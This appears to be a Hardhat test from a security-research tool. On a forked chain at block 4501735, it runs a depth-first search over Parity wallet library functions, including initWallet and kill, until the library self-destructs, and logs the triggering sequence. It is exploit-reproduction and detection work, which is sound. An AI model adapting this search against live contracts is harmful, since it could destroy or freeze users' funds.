import { expect } from 'chai'
import { ethers } from 'hardhat'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'
import { Contract } from 'ethers'
import * as parity from './function/parity_function';

describe('CCA Detects Parity Kill Test', async function () {
    let alice: SignerWithAddress
    let WalletLibrary: Contract
    let walletLibraryAddress: string

    async function checkIncident() {
        let code = await ethers.provider.getCode(walletLibraryAddress)
        let balance = await ethers.provider.getBalance(walletLibraryAddress)
        // If the code is 0x and the balance is 0, then the wallet is killed
        if (code == '0x' && balance == 0n) {
            return true
        }
    }

    beforeEach(async () => {
        ;[alice] = await ethers.getSigners()
        WalletLibrary = await ethers.getContractAt('parity', '0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4')
        walletLibraryAddress = await WalletLibrary.getAddress()
        expect(walletLibraryAddress).to.equal('0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4')
    })
    it('should block number equal to 4501735', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(4501735)
    })

    it('should try all function call combinations to kill the wallet', async function () {
        // If funtion call is view function, then it's priority is lower
        const actions = [
            // Non-view functions
            parity.handleInitWallet,
            parity.handleAddOwner,
            parity.handleRemoveOwner,
            parity.handleKill,
            parity.handleSetDailyLimit,
            parity.handleInitDaylimit,
            parity.handleExecute,
            parity.handleRevoke,
            parity.handleChangeRequirement,
            parity.handleInitMultiowned,
            parity.handleChangeOwner,
            parity.handleResetSpentToday,
        
            // View functions
            parity.handleIsOwner,
            parity.handleNumOwners,
            parity.handleLastDay,
            parity.handleSpentToday,
            parity.handleRequired,
            parity.handleConfirm, 
            parity.handleHasConfirmed,
            parity.handleGetOwner,
            parity.handleDailyLimit
        ];
        
        // DFS to find the sequence of function calls that will kill the wallet
        async function dfs(actionSequence: string[] = [], depth = 0): Promise<boolean> {
            if (depth === actions.length) {
                return false
            }

            for (let i = depth; i < actions.length; i++) {
                await actions[i](WalletLibrary, alice.address)
                actionSequence.push(actions[i].name)

                if (await checkIncident()) {
                    console.log(`Triggering action sequence: ${actionSequence.join(' -> ')}`)
                    return true
                }

                let result = await dfs(actionSequence, depth + 1)
                if (result) return true

                actionSequence.pop()
            }
            return false
        }

        let found = await dfs()
        if (!found) {
            console.log('No selfdestruct sequence found.')
        }
    })
})
